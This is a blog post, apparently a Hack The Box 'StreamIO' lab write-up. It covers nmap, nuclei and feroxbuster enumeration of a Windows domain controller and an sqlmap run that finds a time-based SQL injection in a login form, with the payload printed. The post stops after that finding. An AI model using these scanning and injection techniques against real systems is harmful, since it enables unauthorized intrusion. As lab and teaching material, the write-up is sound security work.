
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="index, follow" />

  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="/theme/stylesheet/style.min.css">

    <link id="dark-theme-style" rel="stylesheet" type="text/css"
        disabled="disabled"
    href="/theme/stylesheet/dark-theme.min.css">

    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
            disabled="disabled"
          href="/theme/pygments/monokai.min.css">
    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
          href="/theme/pygments/github.min.css">


  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/fontawesome.css">
  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/brands.css">
  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/solid.css">

  <link rel="stylesheet" type="text/css" href="/static/css/custom.css">

    <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Security Blog Atom">



  


 

<meta name="author" content="raphajohnsec" />
<meta name="description" content="Click on &#34;Continue Reading&#34; to activate the password field." />
<meta name="keywords" content="#htb, #python, #impacket, #windows, #active-directory, #writeup">


  <meta property="og:site_name" content="Security Blog"/>
  <meta property="og:title" content="HTB - StreamIO - Writeup"/>
  <meta property="og:description" content="Click on &#34;Continue Reading&#34; to activate the password field."/>
  <meta property="og:locale" content="en_US"/>
  <meta property="og:url" content="/drafts/htb-streamio-writeup.html"/>
  <meta property="og:type" content="article"/>
  <meta property="article:published_time" content="2022-06-14 00:00:00+02:00"/>
  <meta property="article:modified_time" content=""/>
  <meta property="article:author" content="/author/raphajohnsec.html">
  <meta property="article:section" content="htb"/>
  <meta property="article:tag" content="#htb"/>
  <meta property="article:tag" content="#python"/>
  <meta property="article:tag" content="#impacket"/>
  <meta property="article:tag" content="#windows"/>
  <meta property="article:tag" content="#active-directory"/>
  <meta property="article:tag" content="#writeup"/>
  <meta property="og:image" content="/images/profile.jpg">

  <title>Security Blog &ndash; HTB - StreamIO - Writeup</title>

</head>
<body class="light-theme">
  <aside>
    <div>
      <a href="/">
        <img src="/images/profile.jpg" alt="Security Blog" title="Security Blog">
      </a>

      <h1>
        <a href="/">Security Blog</a>
      </h1>

<p>Content is my own</p>

      <nav>
        <ul class="list">


              <li>
                <a target="_self"
                   href="/pages/about/">
                  About
                </a>
              </li>

        </ul>
      </nav>

      <ul class="social">
          <li>
            <a  class="sc-twitter" href="https://twitter.com/raphajohnsec" target="_blank">
              <i class="fab fa-twitter"></i>
            </a>
          </li>
      </ul>
    </div>

  </aside>
  <main>

    <nav>
      <a href="/">Home</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="/feeds/all.atom.xml">Atom</a>

    </nav>

<article class="single">
  <header>
      
    <h1 id="htb-streamio-writeup">HTB - StreamIO - Writeup</h1>
    <p>
      Posted on Tue 14 June 2022 in <a href="/category/htb.html">htb</a>

    </p>
  </header>


  <div>
    <p>We have an IP, so we start with the usual, a simple port scan using nmap.</p>
<div class="highlight"><pre><span></span><code><span class="c1"># Nmap 7.80 scan initiated Wed Jun 15 08:35:18 2022 as: nmap -p - -T4 -sV -oA nmap_streamio 10.10.11.158</span>
Nmap scan report <span class="k">for</span> streamio <span class="o">(</span><span class="m">10</span>.10.11.158<span class="o">)</span>
Host is up <span class="o">(</span><span class="m">0</span>.026s latency<span class="o">)</span>.
Not shown: <span class="m">65517</span> filtered ports
PORT      STATE SERVICE       VERSION
<span class="m">53</span>/tcp    open  domain?
<span class="m">80</span>/tcp    open  http          Microsoft IIS httpd <span class="m">10</span>.0
<span class="m">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: <span class="m">2022</span>-06-15 <span class="m">13</span>:14:25Z<span class="o">)</span>
<span class="m">135</span>/tcp   open  msrpc         Microsoft Windows RPC
<span class="m">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
<span class="m">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: streamIO.htb0., Site: Default-First-Site-Name<span class="o">)</span>
<span class="m">443</span>/tcp   open  ssl/http      Microsoft HTTPAPI httpd <span class="m">2</span>.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="m">445</span>/tcp   open  microsoft-ds?
<span class="m">464</span>/tcp   open  kpasswd5?
<span class="m">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="m">1</span>.0
<span class="m">636</span>/tcp   open  tcpwrapped
<span class="m">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="m">2</span>.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="m">9389</span>/tcp  open  mc-nmf        .NET Message Framing
<span class="m">49667</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="m">49673</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="m">1</span>.0
<span class="m">49674</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="m">49701</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="m">61653</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span class="o">=</span><span class="m">7</span>.80%I<span class="o">=</span><span class="m">7</span>%D<span class="o">=</span><span class="m">6</span>/15%Time<span class="o">=</span>62A97E0B%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
SF:ersionBindReqTCP,20,<span class="s2">&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\</span>
<span class="s2">SF:x04bind\0\0\x10\0\x03&quot;</span><span class="o">)</span><span class="p">;</span>
Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span class="c1"># Nmap done at Wed Jun 15 08:39:11 2022 -- 1 IP address (1 host up) scanned in 233.05 seconds</span>
</code></pre></div>

<p>No RDP, but ldap port open and responding with domain information, the host might be an active directory domain controller. Let's see what the http/https ports show.</p>
<div class="highlight"><pre><span></span><code>curl --silent -v http://$TIP
</code></pre></div>

<div class="highlight"><pre><span></span><code>*   Trying 10.10.11.158:80...
* TCP_NODELAY set
* Connected to 10.10.11.158 (10.10.11.158) port 80 (#0)
&gt; GET / HTTP/1.1
&gt; Host: 10.10.11.158
&gt; User-Agent: curl/7.68.0
&gt; Accept: */*
&gt; 
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html
&lt; Last-Modified: Tue, 22 Feb 2022 10:46:01 GMT
&lt; Accept-Ranges: bytes
&lt; ETag: &quot;b23de861d927d81:0&quot;
&lt; Server: Microsoft-IIS/10.0
&lt; X-Powered-By: ASP.NET
&lt; Date: Wed, 15 Jun 2022 13:24:29 GMT
&lt; Content-Length: 703
&lt; 
{ [703 bytes data]
* Connection #0 to host 10.10.11.158 left intact
&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt;
&lt;title&gt;IIS Windows Server&lt;/title&gt;
&lt;style type=&quot;text/css&quot;&gt;
&lt;!--
body {
    color:#000000;
    background-color:#0072C6;
    margin:0;
}

#container {
    margin-left:auto;
    margin-right:auto;
    text-align:center;
    }

a img {
    border:none;
}

--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id=&quot;container&quot;&gt;
&lt;a href=&quot;http://go.microsoft.com/fwlink/?linkid=66138&amp;amp;clcid=0x409&quot;&gt;&lt;img src=&quot;iisstart.png&quot; alt=&quot;IIS&quot; width=&quot;960&quot; height=&quot;600&quot; /&gt;&lt;/a&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div>

<p>Standard IIS site..., https responds with a 404...
Maybe <a href="https://github.com/projectdiscovery/nuclei#install-nuclei">nuclei</a> can find more information.
<img alt="Nuclei http" src="/images/htb/streamio/htb_streamio_nuclei_http.PNG">
Not for http.. Nothing intersting, but https leads to more information
<img alt="Nuclei https" src="/images/htb/streamio/htb_streamio_nuclei_https.PNG">
You can see, nuclei found two DNS names inside the SSL certificate:
- <strong>streamIO.htb</strong>
- <strong>watch.streamIO.htb</strong></p>
<p>Maybe the webserver responds differently whem we talk to the domain instead of the IP.
We specify the hostnames in <code>/etc/hosts</code>. If we ran our own DNS resolver, we could also specify the addresses there.
Include this</p>
<div class="highlight"><pre><span></span><code>10.10.11.158    streamio streamIO.htb0 watch.streamIO.htb streamio.htb
</code></pre></div>

<p>The http response is still the same when requesting <code>http://streamio.htb</code>, but <code>https://streamio.htb</code> now responds with a "real" website.
<img alt="streamio https site" src="/images/htb/streamio/htb_streamio_https_site.PNG">
Also <code>https://watch.streamio.htb</code> reveals a website.
<img alt="streamio https site" src="/images/htb/streamio/htb_streamio_watch_https_site.PNG"></p>
<p>Nuclei couln't find any vulnerabilities for both websites. Time to crawl both sites.
feroxbuster found some available endpoints on <code>https://streamio.htb</code></p>
<div class="highlight"><pre><span></span><code>./feroxbuster -k -u https://streamio.htb/ -x php,html,txt -w directory-list-lowercase-2.3-small.txt -t <span class="m">100</span> -o feroxbuster_streamio.htb.log

<span class="m">200</span>      GET      395l      915w    13497c https://streamio.htb/
<span class="m">301</span>      GET        2l       10w      151c https://streamio.htb/images <span class="o">=</span>&gt; https://streamio.htb/images/
<span class="hll"><span class="m">200</span>      GET      121l      291w     4500c https://streamio.htb/register.php
</span><span class="hll"><span class="m">200</span>      GET      206l      430w     6434c https://streamio.htb/contact.php
</span><span class="hll"><span class="m">200</span>      GET      395l      915w    13497c https://streamio.htb/index.php
</span><span class="hll"><span class="m">200</span>      GET      231l      571w     7825c https://streamio.htb/about.php
</span><span class="hll"><span class="m">200</span>      GET      111l      269w     4145c https://streamio.htb/login.php
</span><span class="hll"><span class="m">301</span>      GET        2l       10w      150c https://streamio.htb/admin <span class="o">=</span>&gt; https://streamio.htb/admin/
</span><span class="m">301</span>      GET        2l       10w      157c https://streamio.htb/admin/images <span class="o">=</span>&gt; https://streamio.htb/admin/images/
<span class="m">403</span>      GET        1l        1w       18c https://streamio.htb/admin/index.php
<span class="m">301</span>      GET        2l       10w      148c https://streamio.htb/css <span class="o">=</span>&gt; https://streamio.htb/css/
<span class="m">301</span>      GET        2l       10w      154c https://streamio.htb/admin/css <span class="o">=</span>&gt; https://streamio.htb/admin/css/
<span class="m">301</span>      GET        2l       10w      147c https://streamio.htb/js <span class="o">=</span>&gt; https://streamio.htb/js/
<span class="m">301</span>      GET        2l       10w      153c https://streamio.htb/admin/js <span class="o">=</span>&gt; https://streamio.htb/admin/js/
<span class="m">302</span>      GET        0l        0w        0c https://streamio.htb/logout.php <span class="o">=</span>&gt; https://streamio.htb/
<span class="m">301</span>      GET        2l       10w      150c https://streamio.htb/fonts <span class="o">=</span>&gt; https://streamio.htb/fonts/
<span class="hll"><span class="m">200</span>      GET        2l        6w       58c https://streamio.htb/admin/master.php
</span><span class="m">301</span>      GET        2l       10w      156c https://streamio.htb/admin/fonts <span class="o">=</span>&gt; https://streamio.htb/admin/fonts/
</code></pre></div>

<p>While trying to analyse <code>https://watch.streamio.htb</code>, feroxbuster and nuclei threw an error or didn't output any results. I thought at first, that the entry in <code>/etc/hosts</code> was wrong, but the entries were correct. I could't fingure why streamio.htb resolved correctly but watch.streamio.htb didn't. To resolve this I had to set up my own DNS resolver as suggested earlier in this article.
Because I use Ubuntu 20.04 as my pwnbox, I can install dnscrypt-proxy from the repository, it's up to date enough.</p>
<div class="highlight"><pre><span></span><code>apt install dnscrypt-proxy
</code></pre></div>

<p>You don't even have to disable existing name server/resolver on the system. dnscrypt-proxy listens by default and the address 127.0.2.1.
I edit the default config slightly, I add the following content just after <code>server_names = ['cloudflare']</code> in <code>/etc/dnscrypt-proxy/dnscrypt-proxy.toml</code>.</p>
<div class="highlight"><pre><span></span><code>cloaking_rules = &#39;cloaking_rules.txt&#39;
</code></pre></div>

<p>We add the file <code>/etc/dnscrypt-proxy/cloaking_rules.txt</code> with the content</p>
<div class="highlight"><pre><span></span><code>*.streamio.htb  10.10.11.158
</code></pre></div>

<p>and to <code>/etc/resolv.conf</code> we add <code>nameserver    127.0.2.1</code> as first nameserver entry. Now we remove the entries from <code>/etc/hosts</code> regarding streamio.htb. 
Restart the service</p>
<div class="highlight"><pre><span></span><code>
</code></pre></div>

<p>Now every DNS request to *.streamio.htb resolves to thhe specified IP.
nuclei now returns some info for <code>watch.streamio.htb</code>, but nothing intersting. But feroxbuster could find some endpoints</p>
<div class="highlight"><pre><span></span><code>200      GET       78l      245w     2829c https://watch.streamio.htb/
200      GET     7193l    19558w   253887c https://watch.streamio.htb/search.php
200      GET       78l      245w     2829c https://watch.streamio.htb/index.php
200      GET       20l       47w      677c https://watch.streamio.htb/blocked.php
301      GET        2l       10w      157c https://watch.streamio.htb/static =&gt; https://watch.streamio.htb/static/
</code></pre></div>

<p>Soooo let's look on all those endpoints...
Starting with the register.php endpoint. We can type in a username and a password. The site will always respond with "Account created" nevertheless, we registered the username before.</p>
<p><img alt="register.php" src="/images/htb/streamio/streamio.htb_register.php.PNG">
<img alt="account created" src="/images/htb/streamio/streamio.htb_register_account_created.php.PNG"></p>
<p>But when we try to login with our newly created user, the login fails. Later on, we will learn, that only one user can login successfully.</p>
<p><img alt="register.php" src="/images/htb/streamio/streamio.htb_login_failed.php.PNG"></p>
<p><code>contact.php</code> had a form available but did't lead to anything.
<code>/admin/index.php</code> showed <strong>FORBIDDEN</strong>, but
<code>admin/master.php</code> showed this</p>
<p><img alt="register.php" src="/images/htb/streamio/streamio.htb_admin_master.php.PNG"></p>
<p><code>watch.streamio.htb/search.php</code> didn't liked SQL injection tries and redirected to <code>blocked.php</code></p>
<p><img alt="register.php" src="/images/htb/streamio/watch.streamio.htb_search_blocked.php.PNG"></p>
<p>Let's see what <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> can do for us. Trying all those found endpoints, I will show the results for <code>login.php</code></p>
<div class="highlight"><pre><span></span><code>sqlmap.py -u https://streamIO.htb/login.php --method POST --data <span class="nv">username</span><span class="o">=</span>FUZZ<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>FUZZ --batch --time-sec <span class="m">1</span>
</code></pre></div>

<p>sqlmap was lucky, sort of lucky because the injection is time based... ZZZZZzzzzzZZZZZzzzzz</p>
<div class="highlight"><pre><span></span><code>sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=FUZZ&#39;;WAITFOR DELAY &#39;0:0:1&#39;--&amp;password=FUZZ
---
web server operating system: Windows 10 or 2016 or 2019
web application technology: Microsoft IIS 10.0, PHP, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
</code></pre></div>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="/tag/htb.html">#htb</a>
      <a href="/tag/python.html">#python</a>
      <a href="/tag/impacket.html">#impacket</a>
      <a href="/tag/windows.html">#windows</a>
      <a href="/tag/active-directory.html">#active-directory</a>
      <a href="/tag/writeup.html">#writeup</a>
    </p>
  </div>





</article>

    <footer>
<p>&copy; 2022 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="False"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Security Blog ",
  "url" : "",
  "image": "/images/profile.jpg",
  "description": ""
}
</script>

</body>
</html>